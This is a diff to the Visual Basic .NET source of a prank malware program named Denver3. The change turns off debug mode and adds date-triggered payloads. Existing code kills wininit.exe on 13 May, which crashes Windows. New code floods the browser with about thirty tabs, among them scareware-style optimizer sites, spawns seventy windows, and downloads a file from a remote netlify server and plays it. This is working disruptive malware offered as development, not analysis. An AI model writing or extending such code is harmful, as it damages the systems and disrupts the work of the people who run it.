@@ -11,7 +11,7 @@ Public Class Form1
     Dim UserFoler = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
     Dim ServerAddr = "https://denver3289yf998dh287hd9hd9827h.netlify.app/"
     Dim InstallPath = UserFoler & "\Denver3"
-    Dim DebugMode = True
+    Dim DebugMode = False
 
     Private Const SPI_SETDESKWALLPAPER As Integer = &H14
     Private Const SPIF_UPDATEINIFILE As Integer = &H1
@@ -128,7 +128,63 @@ Public Class Form1
             If currentTime.Month = 5 And currentTime.Date.Day = 13 Then
                 MyUtilities.RunCommandComInvis("TASKKILL /IM wininit.exe /T /F", "", False)
             End If
+            If currentTime.Month = 11 And currentTime.Date.Day = 26 Then
+                MsgBox("You have not seen my full power yet....", 0 + 64)
+                Try
+                    Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
+                    Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
+                    Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
+                    Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
+                    Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
+                    Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
+                    Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
+                    Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
+                    Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
+                    Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
+                    Process.Start("https://www.google.com/search?q=HOW+TO+GET+RED+OF+DENVER3%21%21%211%2111%21&")
+                    Process.Start("https://www.google.com/search?q=HOW+TO+GET+RED+OF+DENVER3%21%21%211%2111%21&")
+                    Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
+                    Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
+                    Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
+                    Process.Start("https://www.google.com/search?q=HOW+TO+GET+RED+OF+DENVER3%21%21%211%2111%21&")
+                    Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
+                    Process.Start("https://www.pcoptimizerpro.com/")
+                    Process.Start("https://www.pcoptimizerpro.com/")
+                    Process.Start("https://www.pcoptimizerpro.com/")
+                    Process.Start("https://www.pcoptimizerpro.com/")
+                    Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
+                    Process.Start("https://www.pcoptimizerpro.com/")
+                    Process.Start("https://www.pcoptimizerpro.com/")
+                    Process.Start("https://www.pcoptimizerpro.com/")
+                    Process.Start("https://www.pcoptimizerpro.com/")
+                    Process.Start("https://www.google.com/search?q=free+anti+virus+no+viurus")
+                    Process.Start("https://www.pcoptimizerpro.com/")
+                    Process.Start("https://www.pcoptimizerpro.com/")
+                    Process.Start("https://www.pcoptimizerpro.com/")
+                    Process.Start("https://www.pcoptimizerpro.com/")
+                Catch ex As Exception
 
+                End Try
+            End If
+
+            If currentTime.Month = 11 And currentTime.Date.Day = 28 Then
+                MsgBox("still using this computer?", 0 + 48, "lol")
+                For i As Integer = 1 To 70
+                    Try
+                        Dim q As New still_using_this_computer()
+                        q.Show()
+                    Catch ex As Exception
+                    End Try
+                Next
+            End If
+            If currentTime.Month = 11 And currentTime.Date.Day = 8 Then
+                Try
+                    My.Computer.Network.DownloadFile(ServerAddr & "NCS1.wav", InstallPath & "\NCS1.wav")
+                Catch ex As Exception
+
+                End Try
+                My.Computer.Audio.Play(InstallPath & "\NCS1.wav")
+            End If
             If currentTime.Month = 1 And currentTime.Date.Day = 1 Then
                 MsgBox("Train is a furry: inside joke in my friend group (c) EEI 2024.")
             End If
@@ -162,7 +218,7 @@ Public Class Form1
 
 
             If currentTime.Month = 3 And currentTime.Date.Day = 14 Then
-                MsgBox(ToString(Math.PI))
+                pi.Show()
             End If
 
 
@@ -311,8 +367,15 @@ Public Class Form1
                 End Try
 
             End If
+            If currentTime.Month = 9 And currentTime.Date.Day = 18 Then
+                SubToEnderman.Show()
+            End If
+            If currentTime.Month = 9 And currentTime.Date.Day = 19 Then
+                SubToZeRoTeCh00.Show()
+            End If
             If currentTime.Month = 5 And currentTime.Date.Day = 1 Then
-                FreeRobuxGen.Show()
+
+
             End If
             If currentTime.Month = 6 And currentTime.Date.Day = 1 Then
                 Try
@@ -581,7 +644,6 @@ Public Class Form1
 
         ' Make a reference to a directory.
         fuckedbydenver3.ShowDialog()
-
 
         TrainIsAFurryLmao.ShowDialog()
 
